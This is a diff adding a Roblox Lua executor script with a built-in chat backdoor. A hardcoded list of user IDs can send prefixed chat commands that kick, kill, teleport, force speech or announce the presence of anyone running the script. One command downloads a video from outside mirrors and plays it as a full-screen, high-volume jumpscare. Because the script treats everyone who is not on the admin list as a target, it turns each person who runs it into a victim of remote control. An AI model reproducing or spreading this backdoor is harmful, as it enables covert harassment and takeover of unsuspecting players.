@@ -1,0 +1,283 @@
+-- =========== ADMIN ONLY ==============
+-- // === ADMIN PREFIX & SERVICES ===
+local AdminPrefix = ';'
+local Players = game:GetService('Players')
+local ReplicatedStorage = game:GetService('ReplicatedStorage')
+local TextChatService = game:GetService('TextChatService')
+local CoreGui = game:GetService('CoreGui')
+
+local LocalP = Players.LocalPlayer
+
+-- // === ADMIN TABLE ===
+getgenv().AdminTable = {
+	[9365539393] = { Access = 5 }, -- 0therGuys
+	[7639770688] = { Access = 5 }, -- Anonymous
+	[6189092855] = { Access = 5 }, -- SimpIyCoder
+	[4561126088] = { Access = 5 }, -- CIarrisaAteMyDog
+	[7521547567] = { Access = 5 }, -- Diary0fAnnFrank
+	[8553166637] = { Access = 5 }, -- ZiyahuRBLX
+	[5591605050] = { Access = 5 }, -- sum1betterthanulol
+	[5716119895] = { Access = 5 }, -- CoIdSoverign
+	[3757698948] = { Access = 5 }, -- isokcocs
+
+-- [] = { Access = 5 }, -- EXAMPLE
+}
+
+local function getAccess(userId)
+    local d = getgenv().AdminTable[userId]
+    return d and d.Access or 0
+end
+
+-- // === PLAYER SEARCH ===
+getgenv().psearch = function(Name)
+    if not Name or Name == '' then return end
+    for _, p in pairs(Players:GetPlayers()) do
+        if string.lower(p.Name):sub(1, #Name) == string.lower(Name) then
+            return p
+        end
+    end
+end
+
+-- // === SAFE CHAT SENDER ===
+local function sendChatMessageLocally(msg)
+    local channels = TextChatService:FindFirstChild('TextChannels')
+    if channels then
+        local ch = channels:FindFirstChild('RBXGeneral') or channels:FindFirstChild('General') or channels:FindFirstChild('All')
+        if ch and ch:IsA('TextChannel') then
+            pcall(function()
+                ch:SendAsync(msg)
+            end)
+            return
+        end
+    end
+    local chatFolder = ReplicatedStorage:FindFirstChild('DefaultChatSystemChatEvents')
+    if chatFolder then
+        local say = chatFolder:FindFirstChild('SayMessageRequest')
+        if say then
+            pcall(function()
+                say:FireServer(msg, 'All')
+            end)
+        end
+    end
+end
+
+-- // === JUMPSCARE FUNCTION ===
+local function playJumpScare()
+    task.spawn(function()
+        if not isfile('video.webm') then
+            local mirrors = {
+                'https://api.swimhub.xyz/video.webm',
+                'https://raw.githubusercontent.com/swimhubassets/assets/main/video.webm',
+                'https://cdn.swimhub.xyz/video.webm',
+            }
+            for _, url in ipairs(mirrors) do
+                local success, data = pcall(function()
+                    return game:HttpGet(url, true)
+                end)
+                if success and data and #data > 50000 then
+                    writefile('video.webm', data)
+                    break
+                end
+            end
+        end
+
+        repeat task.wait() until isfile('video.webm')
+
+        if not getcustomasset then
+            game.StarterGui:SetCore('SendNotification', {
+                Title = 'Error',
+                Text = 'Executor missing getcustomasset()',
+                Duration = 5,
+            })
+            return
+        end
+
+        local screen = CoreGui:FindFirstChild('RobloxGui') or CoreGui
+        pcall(function() screen.IgnoreGuiInset = true end)
+        for _, v in pairs(screen:GetChildren()) do
+            if v.Name == 'JUMP_SCARE_666' then v:Destroy() end
+        end
+
+        local video = Instance.new('VideoFrame')
+        video.Name = 'JUMP_SCARE_666'
+        video.Size = UDim2.new(1, 0, 1, 0)
+        video.BackgroundTransparency = 1
+        video.ZIndex = 2147483647
+        video.Looped = true
+        video.Visible = false
+        video.Parent = screen
+
+        video.Video = getcustomasset('video.webm')
+        video.Volume = 10
+        video.Visible = true
+        video:Play()
+
+        local flash = Instance.new('Frame', screen)
+        flash.Size = UDim2.new(1, 0, 1, 0)
+        flash.BackgroundColor3 = Color3.new(1, 1, 1)
+        flash.ZIndex = 2147483647
+        task.delay(0.05, function() flash:Destroy() end)
+
+        task.delay(9, function()
+            if video and video.Parent then video:Destroy() end
+        end)
+    end)
+end
+
+-- // === UNIVERSAL COMMAND REGISTRY ===
+getgenv().AdminCmdList = {
+
+    ['kick'] = {
+        Clearence = { [5] = true },
+        CommandFunc = function(Targets, ArgsStr, CmdPlayer)
+            for _, plr in pairs(Targets) do
+                if plr == LocalP then
+                    LocalP:Kick(ArgsStr ~= '' and ArgsStr or 'Kicked by admin')
+                end
+            end
+        end,
+    },
+
+    ['kill'] = {
+        Clearence = { [5] = true },
+        CommandFunc = function(Targets)
+            for _, plr in pairs(Targets) do
+                if plr == LocalP then
+                    local hum = plr.Character and plr.Character:FindFirstChildOfClass('Humanoid')
+                    if hum then hum:ChangeState(Enum.HumanoidStateType.Dead) end
+                end
+            end
+        end,
+    },
+
+    ['jumpscare'] = {
+        Clearence = { [5] = true },
+        CommandFunc = function(Targets)
+            for _, plr in pairs(Targets) do
+                if plr == LocalP then playJumpScare() end
+            end
+        end,
+    },
+
+    ['say'] = {
+        Clearence = { [5] = true },
+        CommandFunc = function(Targets, ArgsStr)
+            if ArgsStr == '' then return end
+            for _, plr in pairs(Targets) do
+                if plr == LocalP then sendChatMessageLocally(ArgsStr) end
+            end
+        end,
+    },
+
+    ['bring'] = {
+        Clearence = { [5] = true },
+        CommandFunc = function(Targets, _, CmdPlayer)
+            local originChar = CmdPlayer.Character
+            local originRoot = originChar and originChar:FindFirstChild('HumanoidRootPart')
+            if not originRoot then return end
+            for _, plr in pairs(Targets) do
+                if plr == LocalP then
+                    local hrp = plr.Character and plr.Character:FindFirstChild('HumanoidRootPart')
+                    if hrp then hrp.CFrame = originRoot.CFrame + Vector3.new(0, 3, 0) end
+                end
+            end
+        end,
+    },
+
+    ['fetch'] = {
+        Clearence = { [5] = true },
+        CommandFunc = function(_, _, CmdPlayer)
+            for _, plr in pairs(Players:GetPlayers()) do
+                if plr == LocalP and getAccess(plr.UserId) < 5 then
+                    sendChatMessageLocally('Here')
+                end
+            end
+        end,
+    },
+}
+
+-- // === SMART TARGET RESOLVER (ADMIN IMMUNITY) ===
+local function resolveTargets(raw, CmdPlayer)
+    local result = {}
+    if not raw or raw == '' then return result end
+
+    local lower = string.lower(raw)
+    local function canBeTarget(p)
+        -- Only affect non-admins (Access < 5)
+        return p and getAccess(p.UserId) < 5
+    end
+
+    if lower == 'all' then
+        for _, p in pairs(Players:GetPlayers()) do
+            if canBeTarget(p) then table.insert(result, p) end
+        end
+        return result
+    end
+
+    if lower == 'others' then
+        for _, p in pairs(Players:GetPlayers()) do
+            if p ~= CmdPlayer and canBeTarget(p) then
+                table.insert(result, p)
+            end
+        end
+        return result
+    end
+
+    local target = getgenv().psearch(raw)
+    if target and canBeTarget(target) then
+        table.insert(result, target)
+    end
+    return result
+end
+
+-- // === UNIVERSAL CHAT PARSER ===
+getgenv().BDCheck = function(Sender, Chat)
+    if type(Chat) ~= 'string' or Chat:sub(1, 1) ~= AdminPrefix then return end
+
+    local args = string.split(Chat:sub(2), ' ')
+    local cmd = table.remove(args, 1)
+    if not cmd or not getgenv().AdminCmdList[cmd] then return end
+
+    local Command = getgenv().AdminCmdList[cmd]
+    local access = getAccess(Sender.UserId)
+    if not Command.Clearence[access] then return end
+
+    local rawTarget = args[1]
+    table.remove(args, 1)
+    local ArgsStr = table.concat(args, ' ')
+
+    local Targets = resolveTargets(rawTarget, Sender)
+    Command.CommandFunc(Targets, ArgsStr, Sender)
+end
+
+-- // === HOOK ALL CHAT CHANNELS ===
+local function hookChannel(ch)
+    if ch:IsA('TextChannel') then
+        ch.MessageReceived:Connect(function(msg)
+            local src = msg.TextSource
+            if src then
+                local speaker = Players:GetPlayerByUserId(src.UserId)
+                if speaker then getgenv().BDCheck(speaker, msg.Text) end
+            end
+        end)
+    end
+end
+
+for _, ch in pairs(TextChatService.TextChannels:GetChildren()) do
+    hookChannel(ch)
+end
+TextChatService.TextChannels.ChildAdded:Connect(hookChannel)
+
+-- // === PRELOAD VIDEO FOR ADMINS ===
+Players.PlayerAdded:Connect(function(plr)
+    if getAccess(plr.UserId) == 5 then
+        task.spawn(function()
+            task.wait(2)
+            if not isfile('video.webm') then
+                pcall(function()
+                    writefile('video.webm', game:HttpGet('https://api.swimhub.xyz/video.webm', true))
+                end)
+            end
+        end)
+    end
+end)
